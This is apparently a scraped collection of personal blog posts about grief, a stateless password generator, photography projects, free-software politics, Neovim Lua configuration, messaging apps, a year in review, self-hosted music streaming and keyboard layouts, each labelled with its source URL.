There's not a day that goes by that I don't think about all of the people that were hurt through it, and of all of the ways things might've been different. I still have dreams a few nights a week about those people. Sometimes, the dreams are sad or scary; sometimes, they're images of what might have been had things not gotten turned upside down, or (most often) they're fantasies of what it might look like for my mistakes — real or imagined — to be forgiven and forgotten. I still have notes from certain people pinned where I can see them daily. But there's also a gaping, ragged hole where there's not communication from people with whom I used to talk regularly.\nRemembering\nIt sometimes feels like grief has hardly left our family's side for the last two years. Undoubtedly, there have been good times amidst the bad. But this week, all of the regret and despair and anger and bitterness and loneliness and sadness and loss have just been almost too much for me. So, I'm writing this partially to get it out of my system, but I'm also writing it because I want to remember. Anna deserves remembrance. My choices about Addie and The Shit and all of the people affected by The Shit deserve remembrance.\nSo, I remember.\nI remember.\nI remember.\n"] at ['https://ameyama.com/blog/grief']

EXCEPT DESCRIPTION FOUND: ['Intro\nHey! I noticed today as I was updating my projects page that I hadn\'t written about Passgen before. Passgen is a stateless password generator. In other words, you enter some information and it spits out a password for you. It\'ll always generate the same password for a given set of inputs. So, if you always enter the same domain, username or email address, and master password, it\'ll always generate the same password.\nA stateless password generator like Passgen is an alternative to using a stateful password manager (one that stores your data somewhere). I\'m not sure yet whether or not I\'m ready to use it for all of my passwords, though; I\'m still testing it out.\nLimitations\nThere are a few known limitations to stateless password managers. I\'ll explain the first one by giving an example.\nImagine that you have these credentials:\n\n  \n    domain: example.com\n    username: someone\n    master password: helloworld\n    maximum length: 32\n  \n\nGiven these inputs, Passgen will always generate this password: ec6fe2d6e9478997f14d04896c2bcae2.\nIn a stateful password manager, you could generate a new password for this particular set of credentials without needing to change any of the information. However, in a stateless password generator like Passgen where the same inputs always generate the same password, you\'d have to change at least one piece of information in order to generate a new password. You could make a change as simple as adding a number to the master password, changing it from helloworld to helloworld1, which would yield a completely new password that looks nothing like the last one: 2dee48fa3153902e1bf87a0d8decee7e. You could also generate a completely new password by changing the domain or username values instead of, or in addition to, the master password value. Well, that\'s great and all, but now you\'d have to remember a new master password for this set of credentials. If you didn\'t change the master passwords for all of your other credentials to match this new master password, then after a while you\'d probably end up in a situation in which you\'d be remembering a different master password for each set of credentials, which is hardly better than not using a password manager at all. However, the one advantage of using a stateless generator even in such a scenario is that it\'s still possible to remember extremely simple inputs (changing them by (for example) only one character at a time (though I\'m not necessarily recommending such a strategy)) and keep track of simple state changes in your head, while at the same time being able to generate completely different passwords for each credential set.\nOf course, you needn\'t use the three fields in Passgen as they\'re labelled; you could easily use them as part of a strategy to help you keep track of the state mentally (or physically or digitally). You could, for example, keep track of non-password values on (say) sticky notes or in a text file somewhere, and you could call those values "rotations" or something. So, on one sticky note, you could have: "example.com: 1", meaning that you\'re on password #1 for example.com. Then, you could go to Passgen and enter that rotation number in one of the fields. In this example, I\'ve moved the username up to the domain field and entered only the rotation number in the username field:\n\n  \n    domain: example.com / someone\n    username: 1\n    master password: helloworld\n    maximum length: 32\n  \n\nThis yields the password: 58f62f196e87e92eb2f2bdbd64112d0b.\nThen, when it\'s time to generate a new password, you\'d cross off "example.com: 1" on your sticky note and replace it with: "example.com: 2". Then, you\'d just enter 2 in the username field next time along with all of the other (same) information:\n\n  \n    domain: example.com / someone\n    username: 2\n    master password: helloworld\n    maximum length: 32\n  \n\nThat would yield the new password: a949c872f373d27369d7c76fc954473f.\nOr you could do something else entirely. There are lots of different strategies that could be used here, and I highly doubt the one I just proposed is the best. In any case, the point is that the "stateless" adjective is a bit misleading; state will almost certainly be necessary over time, but the state lives in your head or on paper or in a text file and not in the keychain itself. Ideally, stateless password generators could act a bit like the one-time password tools that are used as second-factor authenticators nowadays: they could use the domain, username, and master password fields in combination with a rolling time value to generate unique passwords every time. But that\'d require cooperation from web service back-ends, and I have no idea if anyone is looking to develop such a protocol right now.\nThe second limitation is specific to Passgen, and it\'s this: in Passgen, there\'s no way to specify a formula for the generated password. Some websites won\'t let you use special characters as part of your password; others require special characters, or require capital letters or numbers, or have other particular rules. At the moment, there\'s no way to specify such a formula in Passgen. This is partially by design, as remembering a formula in addition to the other information requires memorizing too much state, in my opinion. But that also means that you may not be able to use Passgen in such situations, or that you might always have to remember to modify the password generated by Passgen by appending an exclamation mark or whatever.\nBenefits\nSo, why would you want to use a stateless password generator when you could instead use any of the many popular stateful password managers that already exist? The primary benefit to a tool like Passgen is that there\'s no data to store anywhere, so it can\'t get lost or stolen or corrupted or deleted — unless, of course, I incur some kind of brain damage.\nHaving a stateless password manager also means that I can access my credentials from anywhere in the world as long as I can get to the generator; I don\'t need to download and install software and then sync my keychain to a particular machine. So, if someone stole all of my digital devices, I\'d still be able to access my accounts from a new device without worry.\nTwo more benefits of Passgen specifically are that: (1) it\'s open source, and (2) it works offline. It\'s pretty much just a web page built with Vue, ClipboardJS, and the Node crypto module. You could host it yourself, or download it and use it offline. It doesn\'t send data anywhere, and there\'s no back-end of any kind. It literally just takes your inputs, generates a password, and copies the generated password to the clipboard so that you can paste it somewhere immediately. In fact, it\'d be simple enough to implement in Node itself without any kind of front-end so that it could be used as a command line tool. (You know, I might just do that right now...)\nDisclaimer\nAs I\'ve said before, I\'m not a security expert, so feel free to check for yourself whether it works as intended or not (and please let me know if it doesn\'t). Anyway, enjoy! And let me know if you find it to be useful!\n'] at ['https://ameyama.com/blog/passgen']

Found CONTENT ['Hello from locked down London, in the spring of COVID-19, 2020. I hope that\nyou’re all healthy and limiting social content while waiting for things to\nimprove out there. With everything that’s going on, it’s been a challenge to\nstick to any kind of normal routine, especially to someone as\norganisationally-challenged as I am.\n\nDuring the lockdown, I’ve decided to dedicate a couple of hours every day to\nlong-neglected personal projects, and the first thing I’ve done was to finish\npreparing two projects that have been on the backburner for a while.\n\nDissertation\n\n\n\n  Wan Ying and Snow Ying, from “Girls”, 2017 © Luo Yang\n\n\nThe first project is the dissertation that I wrote for my MA Photography degree\nat the Royal College of Art in 2018. It talks briefly about the post-war history\nof photography in Japan and in China, and explores the work of two\nphotographers, Nagashima Yurie and Luo Yang, and the connections between their\ntwo styles.\n\nIt’s called Luo Yang × Nagashima Yurie: Contemporary East Asian photography and\nthe portraiture of the common ground.\nCheck it out!\n\n\n\nReturnees 海归\n\n\n\n  “I used to fight with my parents all the time about\npolitics, but now, having been abroad, I understand that China has a specific\npath it needs to follow.”\n\n\nThe second project is a weird one. In the summer of 2018,\nI was in Beijing, interviewing and photographing Chinese citizens who had just\nreturned home after a long time abroad. I took many photos, and recorded over 20\nhours of interviews, but after I came back, the project got stuck: I didn’t have\nenough material to produce something meaningful – the story was just not told\nthe way it deserved to.\n\nThis eventually led to a collaboration with a writer friend, Hengtee\nLim, who graciously wrote a short story to match\nthe photographs and the interviews. The story is called “Different Worlds”, and\nit’s included in this project alongside the photographs.\n\n(Hengtee has a collection of short stories, “Something Like\nHope” that would make for a fantastic read in\nthese complicated times. You should get a copy!)\n\nThe other thing that’s included alongside the photographs is quotes taken from\nthe interviews. The quotes are included under pictures, but out of context:\nthose things were not necessarily said by the person in the picture.\n\n\n\nI hope you enjoy these two projects. Please stay safe out there, and wash your hands :)', None] at ['https://gueorgui.net/blog/2020/new-projects-dissertation-returnees/']

Found CONTENT ['This is the gazillionth rebuild of gueorgui dot net. Welcome! Feel free to skip\nto the bottom of the post to see what you can expect from all of this.\n\nI’ve had my own website in some shape or form since pretty much 1995. My\nearliest efforts were hosted on good old Geocities and built around fandom:\nLois &\nClark,\nStar Wars, then Quake. Eventually, as I started to make art myself, the\npersonal websites I built got more sophisticated, I started blogging, though\nintermittently.\n\nI’ve since unfortunately lost most of the posts I’ve written, since I kept\nchanging blogging platforms and hosting providers, and a lot of the content that\nexisted in, say, Posterous, Tumblr, or a random WordPress install didn’t surive\nthe move to the next platform-du-jour. Then social media platforms took over,\nand having your own living, breathing website seemed to become like a thing of\nthe past.\n\n\n\nIn the last year or so, I have become much more aware of the issues surrounding\ndata ownership. Much has been\nwritten\nabout why platforms such as Facebook and Instagram are not working in the\ninterest of the artist, researcher, engineer, musician, etc., and taking back\ncontrol from those companies begins with taking back ownership of data.\n\nThis idea is what fueled the rebuild of this website. I’ve been using platforms\nsuch as Squarespace, Format, and Cargo until recently to host my photography\nportfolio, but this iteration of my website has been\nessentially hand-built, powered by just a static site generator and a few\nopen source tools.\n\n\n\nBefore they were called websites, a personal web presence was referred to as a\nhome page. There is something deeply satisfying about not only owning one’s\n(online) home, but also about building it from scratch, with tools of one’s\nchoosing. In the same sense as cooking your own meal will always be more\nsatisfying than picking a pre-made dish from a menu, so it is for a website. A\nsense of mastery has been achieved. Master of my own domain, so to say.\n\nThis is a welcome feeling in the context of the early 2020s. It also fits nicely\nwith other trends that I have started to notice in my life recently, trends\ntowards more awareness, of more discerning selection, and of more intentional\nwork.\n\nIn all of this, I’ve been inspired by people all around me. Some infinitely\nclose to me (my wife!), some whom I have never met\nbut interact with daily, online, through decentralised social\nnetworks, mailing lists,\nand blogs blogs blogs.\n\n\n\nWith this version of gueorgui dot net, I’m trying to accomplish just three things:\n\n\n  Keep an ongoing documentation of the projects I’m working on, be they\nphotography, software, or anything else.\n  Give something back. Literally all of my work is built on the shoulders of\npeople who decided to put their work back in the world, in one form or the\nother. I want to be the kind of person who does this.\n  Develop my skills as a writer.\n\n\nIf that sounds interesting, you can subscribe to the blog posts through the\nancient technology known as RSS if you want to be sure to not miss\na thing, or if you’d prefer a couple-of-times-a-year sort of deal, subscribe\nto my newsletter instead, and get all the good parts straight in\nyour inbox.\n\nThis one is for the long haul; I’m happy to have you here.\n\n— Gueorgui'] at ['https://gueorgui.net/blog/2020/hello-again-world/']

Found SUMMARY ['Any software is free, if it grants the users the four essential\nfreedoms:\n\n\nfreedom 0: The freedom to run the program as you wish, for any\npurpose.\nfreedom 1: The freedom to study how the program works, and change\nit so it does your computing as you wish\nfreedom 2: The freedom to redistribute copies so you can help\nothers.\nfreedom 3: The freedom to distribute copies of your modified\nversions to others.\n\n\nDenying any one of these freedoms makes your software nonfree. As it\nhappens, some free software project maintainers think it’s OK to impose\ntheir political / ideological stances on who can use their software, and\nfor what purpose it can be used. They are violating the zeroth freedom\nto advance their political agendas. Here are a couple of examples.\n\ncase one: Tusky\n\nTusky is a free software (GPL 3.0) Android client for the fediverse —\nthematically, Mastodon. They Rick Roll users who try to connect to\ninstances they disagree\nwith. You don’t get to decide for your users! And the irony here is its\na client for a supposedly censorship-resistant network. This is in\nviolation of freedom zero.\n\nFunnily enough, Tusky recently got removed from the Play\nStore for serving\n“objectionable content”.\n\n\nThey don’t seem to understand that one can view any content with Tusky\nand that it is not possible for the app developers to check any of it.\n— https://chaos.social/@ConnyDuck/105904015276457450\n\n\nA blatant lie! Doesn’t feel good when someone else decides things for\nyou, now, does it?\n\ncase two: Lemmy\n\nAlso a fediverse application — a federated Reddit clone (AGPL 3.0).\nThey have a hardcoded slur\nfilter that they refuse\nto remove, or at the very least, make configurable. This is just plain\nbad engineering for the sake of politics.\n\nBoth of these software are released under free software licenses, and\nare clearly nonfree. Stop doing this — it benefits nobody. You probably\nfeel like you’re “making a change”, but guess what: you’re not. It is\nmere virtue signalling. Don’t enforce your political agendas on your\nusers.\n\nCensorship is bad for everyone, and it usually never ends well.  There\nis no “correct” way to censor — so don’t even try! If you don’t want\nyour software to be “misused”, release it under a license that is\ncapable of enforcing that.1\n\n\n\n\n\n\nProtip: you can’t.

Found SUMMARY ['If you, like me, never really understood Vimscript and hate the language\nwith a passion, you’re in the right place! You can now get rid of\nVimscript wholesale and replace it with a simpler, faster and elegant-er\nlanguage — Lua! However, this is only possible from Neovim 0.5\nonwards1 and as of now, requires you to install Neovim from HEAD. How\nto do that is left as an exercise to the reader. Also bear in mind that\nthe Lua API is fairly beta right now, and many Vim things don’t have\ndirect interfaces.\n\nSo assuming you’re now running Neovim master, head over to\n~/.config/nvim and create your init.lua. Why, yes, we’re porting\nover your init.vim to init.lua right now! Clear your calendar for\nthe next few hours — bikeshedding your text editor is top priority!\n\nI also recommend going through\nnanotee/nvim-lua-guide\nand Learn Lua in Y minutes\nbefore starting off.\n\nthe directory structure\n\nLua files are typically under ~/.config/nvim/lua, and can be loaded as\nLua modules. This is incredibly powerful — you can structure your\nconfigs however you like.\n$ tree .config/nvim\n.\n|-- ftplugin\n|   `-- ...\n|-- init.lua\n|-- lua\n|   |-- maps.lua\n|   |-- settings.lua\n|   |-- statusline.lua\n|   `-- utils.lua\n`-- plugin\n    `-- ...\n\nThe common approach is to have different\nbits of your config in Lua files under lua/ and require’d in your\ninit.lua, so something like:\n-- init.lua\n\nrequire('settings')    -- lua/settings.lua\nrequire('maps')        -- lua/maps.lua\nrequire('statusline')  -- lua/statusline.lua\n\nthe basics: setting options\n\nVim has 3 kinds of options — global, buffer-local and window-local. In\nVimscript, you’d just set these. In Lua, however, you will have to\nuse one of\n\n\nvim.api.nvim_set_option() — global options\nvim.api.nvim_buf_set_option() — buffer-local options\nvim.api.nvim_win_set_option() — window-local options\n\n\nThese are fairly verbose and very clunky, but fortunately for us, we\nhave “meta-accesors” for these: vim.{o,wo,bo}. Here’s an excerpt from\nmy settings.lua as an example:\nlocal o = vim.o\nlocal wo = vim.wo\nlocal bo = vim.bo\n\n-- global options\no.swapfile = true\no.dir = '/tmp'\no.smartcase = true\no.laststatus = 2\no.hlsearch = true\no.incsearch = true\no.ignorecase = true\no.scrolloff = 12\n-- ... snip ... \n\n-- window-local options\nwo.number = false\nwo.wrap = false\n\n-- buffer-local options\nbo.expandtab = true\n\nIf you’re not sure if an option is global, buffer or window-local,\nconsult the Vim help! For example, :h \'number\':\n'number' 'nu'           boolean (default off)\n                        local to window\n\nAlso note that you don’t set the negation of an option to true, like\nwo.nonumber = true, you instead set wo.number = false.\n\ndefining autocommands\n\nUnfortunately, autocommands in Vim don’t have a Lua interface — it is\nbeing worked on.2 Until then, you will have to use\nvim.api.nvim_command(), or the shorter vim.cmd(). I’ve defined a\nsimple function that takes a Lua table of autocmds as an argument, and\ncreates an augroup for you.\n-- utils.lua\n\nlocal M = {}\nlocal cmd = vim.cmd\n\nfunction M.create_augroup(autocmds, name)\n    cmd('augroup ' .. name)\n    cmd('autocmd!')\n    for _, autocmd in ipairs(autocmds) do\n        cmd('autocmd ' .. table.concat(autocmd, ' '))\n    end\n    cmd('augroup END')\nend\n\nreturn M\n\n-- settings.lua\nlocal cmd = vim.cmd\nlocal u = require('utils')\n\nu.create_augroup({\n    { 'BufRead,BufNewFile', '/tmp/nail-*', 'setlocal', 'ft=mail' },\n    { 'BufRead,BufNewFile', '*s-nail-*', 'setlocal', 'ft=mail' },\n}, 'ftmail')\n\ncmd('au BufNewFile,BufRead * if &ft == "" | set ft=text | endif')\n\ndefining keymaps\n\nKeymaps can be set via vim.api.nvim_set_keymap(). It takes 4\narguments: the mode for which the mapping will take effect, the key\nsequence, the command to execute and a table of options (:h\n:map-arguments).\n-- maps.lua\n\nlocal map = vim.api.nvim_set_keymap\n\n-- map the leader key\nmap('n', '<Space>', '', {})\nvim.g.mapleader = ' '  -- 'vim.g' sets global variables\n\n\noptions = { noremap = true }\nmap('n', '<leader><esc>', ':nohlsearch<cr>', options)\nmap('n', '<leader>n', ':bnext<cr>', options)\nmap('n', '<leader>p', ':bprev<cr>', options)\n\nFor user defined commands, you’re going to have to go the vim.cmd\nroute:\nlocal cmd = vim.cmd\n\ncmd(':command! WQ wq')\ncmd(':command! WQ wq')\ncmd(':command! Wq wq')\ncmd(':command! Wqa wqa')\ncmd(':command! W w')\ncmd(':command! Q q')\n\nmanaging packages\n\nNaturally, you can’t use your favourite Vimscript package manager\nanymore, or at least, not without vim.api.nvim_execing a bunch of\nVimscript (ew!). Thankfully, there are a few pure-Lua plugin managers\navailable to use3 — I personally use, and recommend\npaq. It’s light and makes use of\nthe vim.loop API for async I/O.\npaq’s docs are plentiful, so I’ll skip talking about how to set it up.\n\nbonus: writing your own statusline\n\nImagine using a bloated, third-party statusline, when you can just write\nyour own.4 It’s actually quite simple! Start by defining a table for\nevery mode:\n-- statusline.lua\n\n local mode_map = {\n\t['n'] = 'normal ',\n\t['no'] = 'n·operator pending ',\n\t['v'] = 'visual ',\n\t['V'] = 'v·line ',\n\t['�'] = 'v·block ',\n\t['s'] = 'select ',\n\t['S'] = 's·line ',\n\t['�'] = 's·block ',\n\t['i'] = 'insert ',\n\t['R'] = 'replace ',\n\t['Rv'] = 'v·replace ',\n\t['c'] = 'command ',\n\t['cv'] = 'vim ex ',\n\t['ce'] = 'ex ',\n\t['r'] = 'prompt ',\n\t['rm'] = 'more ',\n\t['r?'] = 'confirm ',\n\t['!'] = 'shell ',\n\t['t'] = 'terminal '\n}\n\nThe idea is to get the current mode from vim.api.nvim_get_mode() and\nmap it to our desired text. Let’s wrap that around in a small mode()\nfunction:\n-- statusline.lua\n\nlocal function mode()\n\tlocal m = vim.api.nvim_get_mode().mode\n\tif mode_map[m] == nil then return m end\n\treturn mode_map[m]\nend\n\nNow, set up your highlights. Again, there isn’t any interface for\nhighlights yet, so whip out that vim.api.nvim_exec().\n-- statusline.lua\n\nvim.api.nvim_exec(\n[[\n  hi PrimaryBlock   ctermfg=06 ctermbg=00\n  hi SecondaryBlock ctermfg=08 ctermbg=00\n  hi Blanks   ctermfg=07 ctermbg=00\n]], false)\n\nCreate a new table to represent the entire statusline itself. You can\nadd any other functions you want (like one that returns the current git\nbranch, for instance). Read :h \'statusline\' if you don’t understand\nwhat’s going on here.\n-- statusline.lua\n\nlocal stl = {\n  '%#PrimaryBlock#',\n  mode(),\n  '%#SecondaryBlock#',\n  '%#Blanks#',\n  '%f',\n  '%m',\n  '%=',\n  '%#SecondaryBlock#',\n  '%l,%c ',\n  '%#PrimaryBlock#',\n  '%{&filetype}',\n}\n\nFinally, with the power of table.concat(), set your statusline. This\nis akin to doing a series of string concatenations, but way faster.\n-- statusline.lua\n\nvim.o.statusline = table.concat(stl)\n\n\n\nthis is what being tpope feels like\n\nYou can now write that plugin you always wished for! I sat down to write\na plugin for fzy5, which you can\nfind here\nalong with my entire Neovim config6. I plan to port a the last of my\nplugin/ directory over to Lua, soon™.\n\nAnd it’s only going to get better when the Lua API is completed. We can\nall be Vim plugin artists now.\n\n\n\n\n\n\nhttps://github.com/neovim/neovim/pull/12235\n\nhttps://github.com/neovim/neovim/pull/12378\n\nAlso see: packer.nvim\n\nThis meme was made by NIH gang.\n\nA less bloated alternative to fzf, written in C.\n\nGitHub link —\n  if you’re into that sort of thing.\n\n\n\n'] at ['https://icyphox.sh/blog/nvim-lua']

Found SUMMARY ['Signal is possibly the most recommended pro-privacy instant\ncommunication app — one that was commonplace in the hacker community,\nand has now gained a lot of mainstream traction, thanks to WhatsApp\ndeciding to screw its userbase over. It certainly presents a more\ncompelling alternative than others in the same space, like WhatsApp\nitself, Telegram, etc. They engineered the Signal\nProtocol, which has\nfound its way into other messaging systems, and has been the base for\nthe likes of OMEMO and Matrix.1 While I admire the tech behind\nSignal, I still believe we can do better, and we ought to.\n\nI have a few gripes with Signal — the biggest of them all is it’s\ncentralized, and in the US no less. This alone makes it not that\ndifferent from WhatsApp — we’re simply moving from one silo to another.\nWhat’s to say that Signal will uphold its values, continue operating\nand evade censorship and potential compromise? To top it off, they’re\nbecoming a fairly high value target off late. And if that isn’t\nconvincing enough, Signal’s massive outage lasting nearly a day2\nshould be enough evidence against centralization. Further, Signal is\nknown to use AWS3 as their cloud provider — what if another\nParler4 happens and the rug is pulled from under Signal’s feet?\n\nA common defense in favor of Signal is, “But it’s all open source!”.\nSure is, but on what basis do I trust them? I don’t mean to sound\nconspiratorial, but what’s to say that the server in production hasn’t\nbeen backdoored? In fact, the Signal server\ncode hasn’t even been\nupdated since April 2020. You’re telling me it’s undergone no changes?\n\nAnother response I usually see is “But Signal is all we have!”. While\nthat is somewhat true — at least by the metric of “secure messengers\nyour granny can use”, there are some promising alternatives who are\nespecially focused on decentralizing E2EE communications.\n\n\nMatrix: Matrix has improved a whole lot, and I\nlike that they’re working to disprove that end-to-end encryption\ncannot be decentralized5.\nSession: While it involves some cryptoshit,\nand hasn’t been verified yet, it’s an interesting alternative to keep\nan eye out for.\n\n\nAll things said, Signal is the shiniest turd we have — it fits most\nthreat models, and does the job alright; I will continue to use it.\nHowever, here’s something to think about: while privacy preserving tech\nis commendable, does it have to come at the cost of user freedoms? Hint:\nit doesn’t, and it shouldn’t.\n\n\n\n\n\n\nhttps://en.wikipedia.org/wiki/Double_Ratchet_Algorithm\n\nhttps://twitter.com/signalapp/status/1350595202872823809\n\nhttps://signal.org/blog/looking-back-on-the-front/\n\nhttps://en.wikipedia.org/wiki/Parler#Shutdown_by_service_providers\n\nhttps://matrix.org/blog/2020/01/02/on-privacy-versus-freedom\n\n\n\n'] at ['https://icyphox.sh/blog/signal']

Found SUMMARY ['Update 2021-01-17: I’m now using Signal. It’s fine for now, but we\ncan do better.\n\nEver since Facebook acquired WhatsApp for $19bn, it was blatantly\nobvious that they wanted in on the massive userbase, and consequently,\nthe data they could collect. The acquisition wasn’t all too bad at\nfirst, I’ll admit — they added in full E2EE via the Signal Protocol,\ntheir privacy policy wasn’t all too bad, at least for a Facebook\nproduct. While I obviously didn’t enjoy using it — being the only\nnon-free app on my phone — I could still put up with it, considering\nhow ubiquitous it is here in India.\n\nThat will no longer be the case, however. With the new privacy\npolicy introduced by\nWhatsApp, the below data will be collected and shared with Facebook and\nits associated companies (quoting from the privacy policy):\n\n\n\nAccount Information. Your phone number, profile name and photo, online\nstatus and status message, last seen status, and receipts may be\navailable to anyone who uses our Services, although you can configure\nyour Services settings to manage certain information available to\nother users.\nYour Contacts and Others. Users with whom you communicate may store or\nreshare your information (including your phone number or messages) with\nothers on and off our Services. You can use your Services settings and\nthe block feature in our Services to manage the users of our Services\nwith whom you communicate and certain information you share.\n\n\n\nAnd if you don’t consent to these — i.e., you don’t click on “Agree” on\nthe pop-up about the new terms, you can no longer use WhatsApp.\nNaturally, I didn’t.\n\nNow, it’s fairly common knowledge that the entirety of India revolves\naround WhatsApp. Everything happens over WhatsApp. Invoices, shopping,\ngeneral logistics and operations, and in my case — university\ncommunications. I’d even declare WhatsApp as “critical infrastructure”,\nlike power and water; without which the country cannot function. That’s\na scary thought in itself — imagine an entire nation relying on\nFacebook for something so pivotal.\n\nSo what are my options? I can either switch to a new messaging app, or\nditch instant messaging altogether.  Let’s explore these.\n\nThere are some neat potential alternatives to WhatsApp, the most popular\none being Signal. While I think Signal is technically sound, I’m\nskeptical about using it primarily due to its centralized nature, hosted\nin the US. Moxie is openly against federation/decentralization.1\n\nAnd then there’s Session, a fork of Signal\nthat aims to be completely decentralized. It uses onion\nrouting, similar to Tor.\nIt does involve some blockshit, but the actual messaging is all done\nover onion routing (they call it “onion requests”). From about 5 minutes\nof usage, I can tell that the app’s UI is very nicely done.  It does\nsuffer from severe UX issues though — you can’t add someone from your\naddress book, rather, you have to paste their Session ID (a long\nalphanumeric) to initiate a conversation. In its current state, Session\nis more “tech for tech people” than “tech for the average user”.\n\nAnd then there’s the issue of actually getting people to use an\nalternate messaging app. I know that 99% percent of the people I talk to\non WhatsApp don’t care about the new privacy policy. I also know that\nthey’re not going to switch for just one guy (me). Further, the\nnetwork effects are enormous. Assuming they did switch, they’d then\nhave to convince all their contacts to do so as well — which isn’t\nhappening.\n\nWhich brings me to the second option: ditching IM completely. This\noption is starting to sound a lot better than having to talk to people\nabout why Facebook is bad, and why privacy matters and why they should\nquit WhatsApp — for what will be the hundredth time. I don’t see any\nimmediate downsides to it. Sure, I’ll miss out on some socializing but\nwho am I kidding, it’s all mostly smalltalk anyway.\n\nPerhaps that’s what I’ll end up doing — use WhatsApp until it works,\nand uninstall it after. Matters of immediate attention can be conveyed\nover a phone call. Otherwise, an SMS/email should do.\n\n\n\n\n\n\nhttps://signal.org/blog/the-ecosystem-is-moving/\n\n\n\n'] at ['https://icyphox.sh/blog/whatsapp']

Found SUMMARY ['It’s been a little over 9 months since the day I left my university\ndorms (got kicked out, rather), in light of the\npandemic. I have my finals going on right now, and 5 days to go\nfor the next examination — a great time to reflect on what I managed to\ndo this year. So here I am, sitting at my little home office-thing, with\na bad cold — as is tradition during December — writing this post.\nLet’s get to it!\n\ninterning at CometChat\n\nI spent a good part of this year interning at\nCometChat, mostly working as an\ninfrastructure engineer. I dabbled with some pretty neat tech — here’s\na quick list of things I worked on:\n\n\nXMPP over WebSockets (RFC 7395). Also wrote\nwsabi — a WebSocket proxy in Nim.\nNever got used, but cool nonetheless.\nOn-premise (bare metal) deployment of our stack using Docker Swarm.\nGoogle Kubernetes Engine (GKE) deployment of our stack.\n\n\nI think there’s value in adding that I experienced a paradigm shift in\nmy view of tools like Kubernetes. I still think they’re bloated and\nabstraction heavy, but they exist to solve a problem — and they do it\nsomewhat okay. In an ideal world, nobody would fall for the “cloud”\nmeme, and wouldn’t toss everything into a container1 — but\nour world is far from that.\n\nthings I made\n\n\nshlide: A slide deck presentation\ntool written in pure bash. Born from a conversation I had with a\nfriend — quickly hacked it together over a weekend. Even used it\nfor a talk I presented!\nvite: Go rewrite of the static site\ngenerator I wrote in Python, way back in 2018. It was a misnomer,\nsince it was far from vite.\n\n\nother hackery\n\nSelf-hosted a bunch of services on my Pi. The only downtime is when my\nISP goes down, which is thankfully not that often. Here’s a list of\nthings running on my Pi right now:\n\n\nradicale: Cal/CardDAV server\nPleroma: Single-user federated social media\ninstance\nfilehost\ngonic: Music streaming server\ncrxn: Cool network\nof cool people.\nFew other things that Nerdy uses.\n\n\nMy OpenBSD install is still going strong! Started at 6.6, now on\n6.8-current. This is most definitely my endgame OS — everything just\nworks, and works very well.\n\nI played r2wars this year, which was hella fun. A\ngood exercise in assembly programming. I even placed 3rd, so that was\nawesome.\n\nthis blog\n\nEvidently, this site has undergone quite a few visual changes. It’s no\nlonger that all-black with white text, with occasional bits of cyan. My\noverall aesthetic has considerably mellowed down — prioritizing good\ntypography over colors.\n$ cat pages/blog/*.md | grep 'date: 2020-' | wc -l\n      26\n\n26 posts this year (including this)! That’s 8 more than the 18 I wrote\nlast year — roughly 1 post every two weeks. Pretty good variety too —\nsome technical, some less so…and some controversial. Heh.\n\nonward and upward\n\nContrary to popular opinion, 2020 wasn’t all that bad — obviously, I\nonly speak for myself. That said, I’m looking forward to 2021 for a\nnumber of reasons: for one, I’ll be done with college (finally!), and\nstarting a full-time job at a company I find really exciting!\n\nI have a few blog post ideas that I didn’t get around to writing this\nyear, so expect to see a few of those. The new job will involve a lot of\ninfra-related work — I’m certain my incredibly sought after insights on\nthose things will find their way here, as well.\n\nAnyway, I’m going to enjoy the rest of this year playing Runeterra and\nHalo MCC. On to greater things in 2021, and I’ll see you next year!\n\n\n\n\n\n\nhttps://i.imgur.com/3eTKEZp.jpg\n\n\n\n'] at ['https://icyphox.sh/blog/2020-in-review']

Found SUMMARY ['Having a self-hosted, centralized music streaming setup has been on my\ntodo list for the longest time. I’d initially tried using NFS, but\nmounting it on my phone was very inconvenient. Incidentally, a few days\nago, the existence of Subsonic/*sonic became known to me.\n\ngonic\n\nI found gonic to be the simplest of\nthem all, and proceeded to set it up on the RPi. There are other\nalternatives too, like Navidrome, which\nships with a web player, or Airsonic.\ngonic stood out the most to me because it’s effectively headless,\nbarring a simple web interface for configuration.\n\nSetting it up was trivial. I did run into an\nissue — I noticed that\nonly songs that were already in folders, sorted by album, were being\npicked up in the scan.\n|-- Void Of Vision - Hyperdaze (2019)\n|   |-- 01. Overture.mp3\n|   |-- 02. Year of the Rat.mp3\n|   |-- 03. Babylon.mp3\n|   |-- 04. If Only.mp3\n|   |-- 05. Slave to the Name.mp3\n|   |-- 06. Adrenaline.mp3\n|   |-- 07. Hole In Me.mp3\n|   |-- 08.

In essence,\nit’s a music organization tool — fetches tags, sorts your collection,\netc. Most of my music has been tagged already, so I skipped that. I only\nit all to be grouped by album. A bit of digging in the docs, and I found\nwhat I wanted: --group-albums.\n\nAnd in my config.yaml, I specified my desired path format like so:\n...\npaths:\n  default: $albumartist - $album%aunique{}/$track $title\n\nFinally, running:\n$ beet import --noautotag --move --group-albums path/to/dirty/music\n\n$ tree ~/music\n...\n\n104 directories, 1108 files\n\nNice! gonic then happily scanned all my music.\n\nactually streaming this music\n\nOn my laptop, I decided to just use the NFS share approach — primarily because\nI’d like to stick to cmus and desktop Subsonic clients like Sublime\nMusic are very clunky.\n\nOn Android, there are quite a few options on F-Droid — I decided to go with\nUltrasonic since it’s the only one\nthat supports Last.fm scrobbling.\n\nAll things considered, I think I’m pretty satisfied with this. ‘twas a good weekend.\n'] at ['https://icyphox.sh/blog/music-streaming']

Found SUMMARY ['I’ve been at my computer everyday, for at least 10 hours at minimum.\nThese past ~6 – 7 months have been the most I’ve ever used my computer.\nEventually, I started experiencing discomfort and pain — especially in\nmy pinkie finger. Typing became a chore, and I found myself using my\nshell’s command history more just to avoid typing commands. I tried\nusing a wrist rest, different keyboard heights, but nothing helped.\n\nThus began my search for a new keyboard layout, and it swiftly concluded\nonce I chanced upon the Workman layout.\nAccording to the website, it is supposedly an improvement over Colemak\nand Dvorak. I skimmed through the numbers and other stats, but\nI honestly didn’t care. “Oh it’s better than the popular alternative\nlayouts? Okay that’s enough for me.”\n\n\n\nI downloaded the tarball containing the different config files for\ndifferent platforms etc. I just needed the xmodmap — that’s the\neasiest way to apply a keyboard layout.\n$ xmodmap xmodmap.workman\n\nTo practice the layout, I used keybr.com. You can\nconfigure the keyboard layout via the settings. Naturally, the first few\ndays were incredibly painful. I was only able to type short sentences\nwith very small words. I tried to not engage in heated discussions on\nIRC, for I could not type up a response in time. However, if I did\nstumble into one, I would switch back to QWERTY just for those couple of\nmessages.\n\nI found myself making the switch less and less, over the next few days.\nChatting on IRC is a great way to learn a layout. Or chatting\nanywhere, really. It forces you to get accustomed to the layout by\ntyping the common words used in conversation. 